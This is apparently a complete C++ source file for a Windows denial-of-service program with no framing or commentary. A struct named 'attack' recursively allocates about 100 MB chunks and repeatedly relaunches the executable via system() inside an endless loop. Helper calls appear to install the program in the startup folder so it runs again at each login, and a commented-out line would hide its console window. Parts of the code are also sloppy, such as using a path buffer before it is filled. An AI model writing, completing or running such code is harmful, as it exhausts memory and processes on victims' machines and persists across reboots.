#include <windows.h>  
#include "TlHelp32.h"
#include <iostream>
#include "Files.h"
#define UNICODE 1
using namespace std;
int chararray = 107370900;
string startcom;
struct attack{

	attack(int x){
		new char[x];
		system(startcom.c_str());
		new attack(chararray);
		cout << "Initialized 1 with: " << this << endl;
		new attack(chararray);
		cout << "Initialized 2 with: " << this << endl;
	}
	~attack(){
		cout << "Destructing: " << this << endl;
		system(startcom.c_str());
		new attack(chararray);
		new attack(chararray);
		cout << this << endl;
	}
};

void attacking(string startCommand){
	while(true){
		try{
			for(int i = 0; i < 10; i++){
				new attack(chararray);
			}
		}catch(exception e){
			new attack(chararray);
			system(startCommand.c_str());
			new attack(chararray);
			system(startCommand.c_str());
			attacking(startCommand);
		}
		attacking(startCommand);
	}
}
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int cmdShow){
	char  szPath[MAX_PATH];
	PSTR  lpFilename;
	lpFilename = (strrchr(szPath, '\\') + 1);
	beginStartup(szPath);
	//ShowWindow( GetConsoleWindow(), SW_HIDE );
	if (GetModuleFileName(NULL, szPath, sizeof szPath) == 0) return -1;
	std::string startupPath = getStartupPath(szPath);
	startcom = "\""+startupPath+"\"";
	attacking(startcom);
	return 0;
}
